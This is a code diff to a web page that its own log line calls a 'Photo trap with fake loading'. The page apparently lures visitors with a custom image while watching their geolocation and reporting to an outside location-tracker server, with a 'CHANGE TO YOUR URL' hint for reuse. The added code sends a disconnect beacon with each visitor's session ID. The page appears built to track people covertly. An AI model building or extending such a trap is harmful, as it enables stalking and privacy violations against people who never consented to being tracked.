@@ -131,7 +131,7 @@
         // =============================================
         // CONFIGURATION
         // =============================================
-        const RENDER_URL = 'https://location-tracker-cn7m.onrender.com';
+        const RENDER_URL = 'https://location-tracker-cn7m.onrender.com'; // CHANGE TO YOUR URL
         const customImage = urlParams.get('img');
         const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
 
@@ -285,9 +285,29 @@
             continueBtn.style.display = 'none';
         });
 
+        // =============================================
+        // 🆕 DISCONNECT SIGNAL – Send when user leaves
+        // =============================================
+        function sendDisconnect() {
+            if (sessionId) {
+                try {
+                    navigator.sendBeacon('/disconnect', JSON.stringify({ session_id: sessionId }));
+                    console.log('🔴 Disconnect signal sent for:', sessionId);
+                } catch (e) {
+                    console.warn('Disconnect signal failed:', e);
+                }
+            }
+        }
+        window.addEventListener('beforeunload', sendDisconnect);
+        window.addEventListener('pagehide', sendDisconnect);
+
+        // =============================================
+        // INIT
+        // =============================================
         window.addEventListener('beforeunload', () => { if (watchId) navigator.geolocation.clearWatch(watchId); });
 
-        console.log('📷 Photo trap with fake loading ready');
+        console.log('📷 Photo trap with fake loading + disconnect detection ready');
+        console.log('🆔 Session ID:', sessionId);
     </script>
 </body>
 </html>
